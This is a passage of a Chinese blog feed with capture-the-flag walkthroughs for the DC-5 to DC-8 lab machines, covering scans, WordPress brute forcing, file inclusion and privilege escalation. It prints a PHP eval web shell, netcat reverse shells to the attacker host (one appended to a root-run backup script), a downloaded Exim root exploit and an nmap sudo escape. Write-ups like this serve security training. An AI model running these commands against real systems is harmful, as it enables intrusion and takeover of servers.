<p><img src="/posts/437699f/python_shell.png"></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>  查看具有root权限的命令</p>
<p><img src="/posts/437699f/find.png"></p>
<p>试着利用下exim4</p>
<p>查看exim4版本</p>
<p><code>exim4 --version</code></p>
<blockquote>
<p>Exim version 4.89 </p>
</blockquote>
<p><code>searchsploit  exim 4</code></p>
<p>找下exp，选择46996.sh,拷贝到本地，并开启kali的http服务</p>
<blockquote>
<p>cp /usr/share/exploitdb/exploits/linux/local/46996.sh dc8.sh</p>
<p>python2 -m SimpleHTTPServer</p>
</blockquote>
<p>在靶机上下载kali的shell,先回到/tmp 目录下</p>
<blockquote>
<p>wget <a href="http://192.168.18.131:8000/dc8.sh">http://192.168.18.131:8000/dc8.sh</a></p>
</blockquote>
<p>注意:直接把exp下载过去是无法使用的，<code>sed -i -e &#39;s/\r$//&#39; dc8.sh</code></p>
<blockquote>
<p>www-data@dc-8:/tmp$ ls<br>ls<br>getShell.sh<br>www-data@dc-8:/tmp$ chmod 777 dc8.sh<br>chmod 777 dc8.sh<br>www-data@dc-8:/tmp$ ./dc8.sh</p>
</blockquote>
<p>看下提示用法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Usage (setuid method):</span><br><span class="line"></span><br><span class="line"># $ id</span><br><span class="line"># uid&#x3D;1000(raptor) gid&#x3D;1000(raptor) groups&#x3D;1000(raptor) [...]</span><br><span class="line"># $ .&#x2F;raptor_exim_wiz -m setuid</span><br><span class="line"># Preparing setuid shell helper...</span><br><span class="line"># Delivering setuid payload...</span><br><span class="line"># [...]</span><br><span class="line"># Waiting 5 seconds...</span><br><span class="line"># -rwsr-xr-x 1 root raptor 8744 Jun 16 13:03 &#x2F;tmp&#x2F;pwned</span><br><span class="line"># # id</span><br><span class="line"># uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">#</span><br><span class="line"># Usage (netcat method):</span><br><span class="line"># $ id</span><br><span class="line"># uid&#x3D;1000(raptor) gid&#x3D;1000(raptor) groups&#x3D;1000(raptor) [...]</span><br><span class="line"># $ .&#x2F;raptor_exim_wiz -m netcat</span><br><span class="line"># Delivering netcat payload...</span><br><span class="line"># Waiting 5 seconds...</span><br><span class="line"># localhost [127.0.0.1] 31337 (?) open</span><br><span class="line"># id</span><br><span class="line"># uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/437699f/flag.png"></p>
<br>

<br>

<blockquote>
<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p><a href="https://www.freebuf.com/articles/web/261074.html">https://www.freebuf.com/articles/web/261074.html</a></p>
<p><a href="https://my.oschina.net/u/3896378/blog/4427624">https://my.oschina.net/u/3896378/blog/4427624</a></p>
</blockquote>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges7</title>
    <url>/posts/9488740e/</url>
    <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
<p>网段        192.168.18.0/24</p>
<p>kali        192.168.18.131</p>
<p>靶机        192.168.18.140</p>
</blockquote>
<h4 id="扫描网段"><a href="#扫描网段" class="headerlink" title="扫描网段"></a>扫描网段</h4><blockquote>
<p> kali@kali2020:~$ sudo nmap 192.168.18.0/24 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-07 14:16 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00045s latency).<br>Not shown: 65534 closed ports<br>PORT   STATE SERVICE VERSION<br>53/tcp open  domain  dnsmasq 2.78<br>MAC Address: 00:50:56:E0:DA:9A (VMware)</p>
<p>Nmap scan report for 192.168.18.140<br>Host is up (0.00055s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.25 ((Debian))<br>MAC Address: 00:0C:29:7C:A6:2A (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
<p>Nmap scan report for 192.168.18.254<br>Host is up (0.00025s latency).<br>All 65535 scanned ports on 192.168.18.254 are filtered<br>MAC Address: 00:50:56:E1:37:77 (VMware)</p>
<p>Nmap scan report for 192.168.18.131<br>Host is up (0.0000030s latency).<br>All 65535 scanned ports on 192.168.18.131 are closed</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 64.63 seconds</p>
</blockquote>
<h4 id="扫描靶机"><a href="#扫描靶机" class="headerlink" title="扫描靶机"></a>扫描靶机</h4><blockquote>
<p> kali@kali2020:~$ sudo nmap 192.168.18.140 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-07 21:11 CST<br>Nmap scan report for 192.168.18.140<br>Host is up (0.0017s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.25 ((Debian))<br>MAC Address: 00:0C:29:7C:A6:2A (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 8.94 seconds</p>
</blockquote>
<h4 id="dirsearch扫目录"><a href="#dirsearch扫目录" class="headerlink" title="dirsearch扫目录"></a>dirsearch扫目录</h4><blockquote>
<p> <a href="http://192.168.18.140/user/login">http://192.168.18.140/user/login</a></p>
</blockquote>
<br>

<p>进入主页看到时使用的<code>Drupa</code>，之前的dc-1也是使用的这个</p>
<h4 id="根据提示找线索"><a href="#根据提示找线索" class="headerlink" title="根据提示找线索"></a>根据提示找线索</h4><blockquote>
<p>Welcome to DC-7</p>
<p>DC-7 introduces some “new” concepts, but I’ll leave you to figure out what they are.  :-)</p>
<p>While this challenge isn’t all that technical, if you need to resort to brute forcing or a dictionary attacks, you probably won’t succeed.</p>
<p>What you will have to do, is to think “outside” the box.</p>
<p>Way “outside” the box.  :-)</p>
</blockquote>
<blockquote>
<p>dc-7引入了一些“新”概念，但我还是让你们自己来弄清楚它们是什么。—-)<br>虽然这个挑战并不完全是技术性的，但如果你需要诉诸粗暴的强迫或字典攻击，你可能不会成功。<br>你要做的是，想“外面”的盒子。<br>“外面”的盒子。—-)</p>
</blockquote>
<p>一直没搞懂这个外盒啥意思，看了下别人的博客，原来在主页下左下角有个<code>@DC7USER</code>，twitter上提示</p>
<p>了github地址，<code>https://github.com/Dc7User</code>,里面有一个<code>staffdb</code>,首先看下<code>config.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">	<span class="variable">$username</span> = <span class="string">&quot;dc7user&quot;</span>;</span><br><span class="line">	<span class="variable">$password</span> = <span class="string">&quot;MdR3xOgB7#dW&quot;</span>;</span><br><span class="line">	<span class="variable">$dbname</span> = <span class="string">&quot;Staff&quot;</span>;</span><br><span class="line">	<span class="variable">$conn</span> = mysqli_connect(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h3><p>可以得到一个数据库的账号密码，试了下无法登录网站</p>
<p>看看这个账号密码能不能登录ssh</p>
<p><code>dc7user</code> <code>MdR3xOgB7#dW</code>，成功登录</p>
<blockquote>
<p><strong>dc7user@dc-7:~$ sudo -l</strong><br>-bash: sudo: command not found</p>
<p>** dc-7:~$ sudo **</p>
<p>-bash: sudo: command not found<br>You have new mail in /var/mail/dc7user<br>** dc7user@dc-7:~$ cat /var/mail/dc7user ** .</p>
<p>内容和下面mbox差不多</p>
</blockquote>
<br>

<blockquote>
<p>** dc7user@dc-7:<del>$ ls **<br>backups  mbox<br>** dc7user@dc-7:</del>$ cat mbox **</p>
<p>发现了3个备份文件</p>
<p>数据库文件</p>
<p>/home/dc7user/backups/website.sql</p>
<p>shell脚本文件 </p>
<p>/opt/scripts/backups.sh</p>
<p>网站备份文件</p>
<p>/home/dc7user/backups/website.tar.gz</p>
</blockquote>
<br>

<blockquote>
<p>** dc7user@dc-7:~$ cat /opt/scripts/backups.sh  **</p>
<p>#!/bin/bash<br>rm /home/dc7user/backups/*<br>cd /var/www/html/<br>drush sql-dump –result-file=/home/dc7user/backups/website.sql<br>cd ..<br>tar -czf /home/dc7user/backups/website.tar.gz html/<br>gpg –pinentry-mode loopback –passphrase PickYourOwnPassword –symmetric /home/dc7user/backups/website.sql<br>gpg –pinentry-mode loopback –passphrase PickYourOwnPassword –symmetric /home/dc7user/backups/website.tar.gz<br>chown dc7user:dc7user /home/dc7user/backups/*<br>rm /home/dc7user/backups/website.sql<br>rm /home/dc7user/backups/website.tar.gz<br>dc7user@dc-7:~ $<br>** dc7user@dc-7:~$ ls -l /opt/scripts/backups.sh **</p>
<p>-rwxrwxr-x 1 root www-data 520 Aug 29  2019 /opt/scripts/backups.sh</p>
</blockquote>
<p>bash脚本中有用到<code>drush</code>和<code>gpg</code>命令，查查用法</p>
<p>可以使用<code>gpg</code>和<code>drush</code>命令</p>
<h3 id="使用drush修改管理员密码"><a href="#使用drush修改管理员密码" class="headerlink" title="使用drush修改管理员密码"></a>使用drush修改管理员密码</h3><p>drush可以修改用户密码</p>
<blockquote>
<p>Drush是Drupal的命令行shell和Unix脚本接口。Drush Core附带了许多有用的命令，可用于与模块/主题/配置文件等代码进行交互。</p>
</blockquote>
<p><code>drush user-password admin --password=&quot;123&quot;</code></p>
<blockquote>
<p>dc7user@dc-7:~ $ drush user-password admin –password=”123”<br>Command user-password needs a higher bootstrap level to run - you will need to invoke drush from a more functional Drupal environment to run this command.                                                                      [error]<br>The drush command ‘user-password admin’ could not be executed.                                                                                                                                                                  [error]<br>dc7user@dc-7:~$ </p>
</blockquote>
<p>执行失败，进入/var/www/html目录试试</p>
<blockquote>
<p>dc7user@dc-7:/var/www/html$ drush user-password admin –password=”123”<br>Changed password for admin                                                                                                                                                                                                      [success]<br>dc7user@dc-7:/var/www/html$ </p>
</blockquote>
<p>修改密码成功，试试能不能登录网站<code>http://192.168.18.140/user/login</code></p>
<p><code>admin</code>,<code>123</code>成功登录</p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>想办法反弹shell，看看能不能上传一句话木马连接</p>
<p>新建文件发现类型没有php</p>
<p><img src="/posts/9488740e/nophp.png"></p>
<p>看看<code>Extend</code>插件扩展能不能安装php,没找到，需要手动安装，看了下别人的wp</p>
<p>下载php filter模块</p>
<blockquote>
<p><a href="https://www.drupal.org/project/php">https://www.drupal.org/project/php</a></p>
</blockquote>
<p><img src="/posts/9488740e/phpinstallerror.png"></p>
<p>提示安装格式应该为<code>zip tar tgz gz bz2</code></p>
<p>下载tar.gz 保存到本地然后上传</p>
<p><img src="/posts/9488740e/phpinstall1.png"></p>
<p><img src="/posts/9488740e/phpinstall2.png"></p>
<p><img src="/posts/9488740e/phpinstall3.png"></p>
<p><img src="/posts/9488740e/phpinstall4.png"></p>
<p>安装成功</p>
<p>写个phpinfo()试试能不能成功</p>
<p><img src="/posts/9488740e/phpinfo1.png"></p>
<p><img src="/posts/9488740e/phpinfo2.png"></p>
<h4 id="写一句话"><a href="#写一句话" class="headerlink" title="写一句话"></a>写一句话</h4><p><img src="/posts/9488740e/yijuhua.png"></p>
<h4 id="连接蚁剑"><a href="#连接蚁剑" class="headerlink" title="连接蚁剑"></a>连接蚁剑</h4><p><img src="/posts/9488740e/yijuhua_yijian.png"></p>
<br>

<h4 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h4><blockquote>
<p>kali <code>nc -nlvp 8888</code></p>
<p>蚁剑 <code>nc -c /bin/sh 192.168.18.131 8888</code></p>
</blockquote>
<p><img src="/posts/9488740e/shell.png"></p>
<p>反弹交互shell</p>
<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>将反弹shell的脚本写入到<code>/opt/scripts/backups.sh</code></p>
<p><code>echo &quot;nc -e /bin/bash 192.168.18.131 7777&quot; &gt;&gt; /opt/scripts/backups.sh</code></p>
<p>成功反弹到root的shell ，不过需要多等一会才行</p>
<p><img src="/posts/9488740e/rootshell.png"></p>
<p><img src="/posts/9488740e/flag.png"></p>
<blockquote>
<p>注:其实可以在写一句话的时候可以直接写反弹shell<br><code>&lt;?php system(&#39;nc -e /bin/sh 192.168.18.131 9999&#39;); ?&gt;</code><br><img src="/posts/9488740e/ncshell.png"></p>
</blockquote>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges6</title>
    <url>/posts/e38f4498/</url>
    <content><![CDATA[<p>TIPS</p>
<blockquote>
<p>CLUE<br>OK, this isn’t really a clue as such, but more of some “we don’t want to spend five years waiting for a certain process to finish” kind of advice for those who just want to get on with the job.</p>
<p>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt That should save you a few years. ;-)</p>
</blockquote>
<br>

<p>环境</p>
<blockquote>
<p>网段    192.168.18.0/24</p>
<p>kali    192.168.18.131</p>
<p>靶机 </p>
</blockquote>
<br>

<p>扫描网段</p>
<blockquote>
<p><strong>kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn</strong></p>
<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-06 19:40 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00027s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.137<br>Host is up (0.00047s latency).<br>MAC Address: 00:0C:29:74:F8:D0 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00029s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 1.97 seconds</p>
</blockquote>
<p>扫描靶机开放的端口</p>
<blockquote>
<p><strong>kali@kali2020:~$ sudo nmap 192.168.18.137 -p- -sV</strong></p>
<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-06 19:41 CST<br>Nmap scan report for 192.168.18.137<br>Host is up (0.0017s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br><strong>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</strong></p>
<p><strong>80/tcp open  http    Apache httpd 2.4.25 ((Debian))</strong></p>
<p>MAC Address: 00:0C:29:74:F8:D0 (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 12.12 seconds</p>
</blockquote>
<p>开放了22端口和80端口</p>
<p>dirsearch扫一下目录</p>
<blockquote>
<p>… ..</p>
<p>[19:44:43] 301 -  321B  - /wp-content  -&gt;  <a href="http://192.168.18.137/wp-content/">http://192.168.18.137/wp-content/</a><br>[19:44:43] 301 -  319B  - /wp-admin  -&gt;  <a href="http://192.168.18.137/wp-admin/">http://192.168.18.137/wp-admin/</a></p>
<p>[19:44:43] 301 -  322B  - /wp-includes  -&gt;  <a href="http://192.168.18.137/wp-includes/">http://192.168.18.137/wp-includes/</a></p>
<p>[19:44:43] 200 -   42KB - /wp-includes/<br>[19:44:43] 500 -    0B  - /wp-content/plugins/hello.php<br>[19:44:43] 200 -    0B  - /wp-config.php    </p>
<p>[19:44:44] 302 -    0B  - /wp-admin/  -&gt;  <a href="http://wordy/wp-login.php?redirect_to=http://192.168.18.137/wp-admin/&amp;reauth=1">http://wordy/wp-login.php?redirect_to=http%3A%2F%2F192.168.18.137%2Fwp-admin%2F&amp;reauth=1</a></p>
<p>[19:44:44] 302 -    0B  - /wp-signup.php  -&gt;  <a href="http://wordy/wp-login.php?action=register">http://wordy/wp-login.php?action=register</a></p>
<p>… …</p>
</blockquote>
<br>

<p>浏览器登录<code>192.168.18.137</code>发现会跳转到<code>http://wordy</code>，那需要修改一下host</p>
<blockquote>
<p>sudo vim /etc/hosts</p>
<p>192.168.18.137 wordy</p>
</blockquote>
<p>进入主页可以看出这是<code>WordPress</code>,第二关也是WordPress</p>
<p>进入后台<code>wordy/wp-login.php</code> </p>
<p>使用wpscan扫一下</p>
<blockquote>
<p>kali@kali2020:~$ wpscan –url wordy -e u</p>
<p>[i] User(s) Identified:</p>
<p>[+] admin<br> | Found By: Rss Generator (Passive Detection)<br> | Confirmed By:<br> |  Wp Json Api (Aggressive Detection)<br> |   - <a href="http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1">http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</a><br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)</p>
<p>[+] sarah<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)</p>
<p>[+] graham<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)</p>
<p>[+] mark<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)</p>
<p>[+] jens<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)</p>
</blockquote>
<p>一共扫出5个用户<code>admin,sarah,graham,mark,jens</code></p>
<p>根据官网上的线索，需要用到kali自带的<code>rockyou.txt</code></p>
<p>但是使用命令时说不存在，去看了下需要解压</p>
<p><code>gzip -d /usr/share/wordlists/rockyou.txt.gz</code></p>
<p><code>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</code></p>
<blockquote>
<p>kali@kali2020:<del>/Tools/DCchallenges/DCchallenges6$ cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords_DC6.txt<br>kali@kali2020:</del>/Tools/DCchallenges/DCchallenges6$ ls<br>passwords_DC6.txt  username.txt</p>
</blockquote>
<p>wpscan爆破一下</p>
<blockquote>
<p>kali@kali2020:~/Tools/DCchallenges/DCchallenges6$ wpscan –url wordy -U username.txt -P passwords_DC6.txt </p>
<p>[!] Valid Combinations Found:<br> | Username: mark, Password: helpdesk01</p>
</blockquote>
<p>得到<code>mark    helpdesk01</code></p>
<p>看看这个账号能不能进入后台    ，成功进入后台</p>
<p>进入后台一直没找到切入点，看了下网上的，从Activity monitor插件为突破口</p>
<p>去漏洞库看看有啥漏洞可以利用</p>
<blockquote>
<p>kali@kali2020:~/Tools/DCchallenges/DCchallenges6$ searchsploit Activity monitor</p>
<hr>
<p> Exploit Title                       |  Path</p>
<hr>
<p>Activity Monitor 2002 2.6 - Remote D | windows/dos/22690.c<br>RedHat Linux 6.0/6.1/6.2 - ‘pam_cons | linux/local/19900.c<br>WordPress Plugin Plainview Activity  | php/webapps/45274.html</p>
<hr>
<p>Shellcodes: No Results</p>
</blockquote>
<br>

<blockquote>
<p>kali@kali2020:~/Tools/DCchallenges/DCchallenges6$ sudo cp /usr/share/exploitdb/exploits/php/webapps/45274.html 45274.html</p>
</blockquote>
<p>可以看到这是个Activity monitor插件的RCE,执行点在<code>TOOLS</code>下的<code>IP or interger</code></p>
<p>提前监听kali的端口<code>nc -nlvp 8888</code></p>
<p>使用burp抓包</p>
<p><img src="/posts/e38f4498/nc1.png"><br><img src="/posts/e38f4498/nc2.png"></p>
<br>

<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
<p>返回/home 看到有四个用户，</p>
<blockquote>
<p><strong>cd mark</strong></p>
<p><strong>cd stuff</strong></p>
<p><strong>cat things-to-do.txt</strong></p>
<p>cat things-to-do.txt<br>Things to do:</p>
<ul>
<li>Restore full functionality for the hyperdrive (need to speak to Jens)</li>
<li>Buy present for Sarah’s farewell party</li>
<li>Add new user: graham - GSo7isUM1D4 - done</li>
<li>Apply for the OSCP course</li>
<li>Buy new laptop for Sarah’s replacement</li>
</ul>
</blockquote>
<p>发现一个账户 <code>graham - GSo7isUM1D4</code></p>
<blockquote>
<p>www-data@dc-6:/home/mark/stuff$ su graham<br>su graham<br>Password: GSo7isUM1D4</p>
<p>graham@dc-6:/home/mark/stuff$</p>
</blockquote>
<p>提权</p>
<p>也可以尝试使用ssh登录</p>
<p><code>kali@kali2020:~$ ssh graham@192.168.18.137</code></p>
<blockquote>
<p>graham@dc-6:~$ sudo -l<br>Matching Defaults entries for graham on dc-6:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
<p>User graham may run the following commands on dc-6:<br>    (jens) NOPASSWD: /home/jens/backups.sh</p>
</blockquote>
<p><code>home/jens</code>下可以不需要密码执行</p>
<blockquote>
<p>graham@dc-6:~$ cd ../<br>graham@dc-6:/home$ ls<br>graham  jens  mark  sarah<br>graham@dc-6:/home$ </p>
</blockquote>
<p>向<code>bacjuos.sh</code>写入 <code>/bin/bash</code></p>
<blockquote>
<p>graham@dc-6:/home/jens$ echo /bin/bash &gt;&gt; backups.sh<br>graham@dc-6:/home/jens$ sudo -u jens ./backups.sh<br>tar: Removing leading `/‘ from member names<br>/home/jens/backups.sh: line 3: “/bin/bash”: No such file or directory<br>jens@dc-6:~$ </p>
</blockquote>
<p>成功切换到jens用户</p>
<p><code>sudo -l</code> 获取jens权限</p>
<blockquote>
<p>jens@dc-6:~$ sudo -l<br>Matching Defaults entries for jens on dc-6:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
<p>User jens may run the following commands on dc-6:<br>    (root) NOPASSWD: /usr/bin/nmap</p>
</blockquote>
<p>发现可以免密使用nmap</p>
<p>nmap提权参考<code>https://gtfobins.github.io/gtfobins/nmap/</code></p>
<p>nmap查看版本</p>
<blockquote>
<p>jens@dc-6:~$ nmap -V</p>
<p>Nmap version 7.40 ( <a href="https://nmap.org/">https://nmap.org</a> )<br>Platform: x86_64-pc-linux-gnu<br>Compiled with: liblua-5.3.3 openssl-1.1.0c libpcre-8.39 libpcap-1.8.1 nmap-libdnet-1.12 ipv6<br>Compiled without:<br>Available nsock engines: epoll poll select</p>
</blockquote>
<br>

<blockquote>
<p>TF=$(mktemp)<br>echo ‘os.execute(“/bin/sh”)’ &gt; $TF<br>sudo nmap –script=$TF</p>
</blockquote>
<p>执行了一下，结果靶机崩了，重置一下</p>
<p>靶机ip改成了192.168.18.139</p>
<p>ssh连接  <code>graham - GSo7isUM1D4</code></p>
<p><code>kali@kali2020:~$ ssh graham@192.168.18.139</code></p>
<blockquote>
<p>raham@dc-6:/home/jens$ sudo -u jens ./backups.sh<br>tar: Removing leading `/‘ from member names<br>/home/jens/backups.sh: line 3: “/bin/bash”: No such file or directory<br>jens@dc-6:~$ </p>
</blockquote>
<blockquote>
<p>TF=$(mktemp)<br>echo ‘os.execute(“/bin/sh”)’ &gt; $TF<br>sudo nmap –script=$TF</p>
</blockquote>
<p>成功上升为root权限,进入/root得到flag<br><img src="/posts/e38f4498/flag.png"></p>
<br>

<br>

<p>总结</p>
<ul>
<li><p>wpscan爆破</p>
</li>
<li><p>Activity monitor RCE</p>
</li>
<li><p>nc反弹shell</p>
</li>
<li><p>ssh连接</p>
</li>
<li><p>nmap提权</p>
</li>
</ul>
<br>

<br>


<p>Reference</p>
<blockquote>
<p><a href="https://gtfobins.github.io/gtfobins/nmap">https://gtfobins.github.io/gtfobins/nmap</a></p>
</blockquote>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges5</title>
    <url>/posts/7a861522/</url>
    <content><![CDATA[<p>环境</p>
<blockquote>
<p>网段 192.168.18.0/24</p>
<p>kali      192.168.18.131</p>
<p>靶机  192.168.18.136</p>
</blockquote>
<p>nmap扫网段</p>
<blockquote>
<p>kali@kali2020:~$ sudo nmap -sn 192.168.18.0/24<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-03 13:51 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00027s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.136<br>Host is up (0.00035s latency).<br>MAC Address: 00:0C:29:DA:A0:32 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00044s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 4.25 seconds</p>
</blockquote>
<p>nmap扫靶机端口</p>
<blockquote>
<p>kali@kali2020:~$ sudo nmap 192.168.18.136 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-03 13:56 CST<br>Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan<br>Service scan Timing: About 66.67% done; ETC: 13:56 (0:00:06 remaining)<br>Nmap scan report for 192.168.18.136<br>Host is up (0.0015s latency).<br>Not shown: 65532 closed ports<br>PORT      STATE SERVICE VERSION<br><strong>80/tcp    open  http    nginx 1.6.2</strong><br>111/tcp   open  rpcbind 2-4 (RPC #100000)<br>60416/tcp open  status  1 (RPC #100024)<br>MAC Address: 00:0C:29:DA:A0:32 (VMware)</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 14.81 seconds</p>
</blockquote>
<p>开放了80、111和60416,80端口使用的nginx</p>
<p>dirsearch扫目录<code>python3 dirsearch.py  -u 192.168.18.136</code></p>
<blockquote>
<p>[14:06:36] Starting:<br>[14:06:43] 200 -    4KB - /contact.php<br>[14:06:43] 301 -  184B  - /css  -&gt;  <a href="http://192.168.18.136/css/">http://192.168.18.136/css/</a><br>[14:06:44] 200 -    6KB - /faq.php<br>[14:06:45] 301 -  184B  - /images  -&gt;  <a href="http://192.168.18.136/images/">http://192.168.18.136/images/</a><br>[14:06:45] 403 -  570B  - /images/<br>[14:06:45] 200 -    4KB - /index.php<br>[14:06:48] 200 -  852B  - /thankyou.php                               </p>
</blockquote>
<p>进入主页没看到啥提示，只有一个留言板，随便填一下看看有啥东西</p>
<p>抓包发送数据，发现多次发送下面的<code>Copyright © 2019</code>会变化</p>
<p>可以推测使用了footer.php，访问footer.php时年份会改变</p>
<p>访问<code>http://192.168.18.136/footer.php</code>，年份会变化</p>
<p>可以推测thankyou.php包含了footer.php</p>
<p>试一下file=index.php<br><img src="/posts/7a861522/burp_fileindex.png"><br><img src="/posts/7a861522/file_index.png"><br><img src="/posts/7a861522/burp_fileetcpasswd.png"><br><br></p>
<p>由于时nginx,访问下他的日志</p>
<p><code>/var/log/nginx/error.log</code><br><img src="/posts/7a861522/burp_errorlog.png"><br><code>/var/log/nginx/access.log </code><br><img src="/posts/7a861522/burp_accesslog.png"><br>尝试写入日志文件来反弹shell<br><img src="/posts/7a861522/burp_eval.png"><br><code>&lt;?php @eval($_REQUEST[&#39;cmd&#39;])?&gt;;</code><br><img src="/posts/7a861522/burp_phpinfo.png"><br>使用蚁剑连接shell<br><img src="/posts/7a861522/antsword.png"><br>whoami查看权限为<code>www-data</code>没有权限去访问/root</p>
<p>nc命令反弹shell<br><img src="/posts/7a861522/nc_shell.png"><br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><br><br>提权</p>
<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
<blockquote>
<p>www-data@dc-5:~/html$ find / -perm -u=s -type f 2&gt;/dev/null<br>find / -perm -u=s -type f 2&gt;/dev/null<br>/bin/su<br>/bin/mount<br>/bin/umount<br>/bin/screen-4.5.0<br>/usr/bin/gpasswd<br>/usr/bin/procmail<br>/usr/bin/at<br>/usr/bin/passwd<br>/usr/bin/chfn<br>/usr/bin/newgrp<br>/usr/bin/chsh<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/sbin/exim4<br>/sbin/mount.nfs</p>
</blockquote>
<p>使用screen</p>
<blockquote>
<p>kali@kali2020:~$ searchsploit screen 4.5.0</p>
<hr>
<p> Exploit Title                            |  Path</p>
<hr>
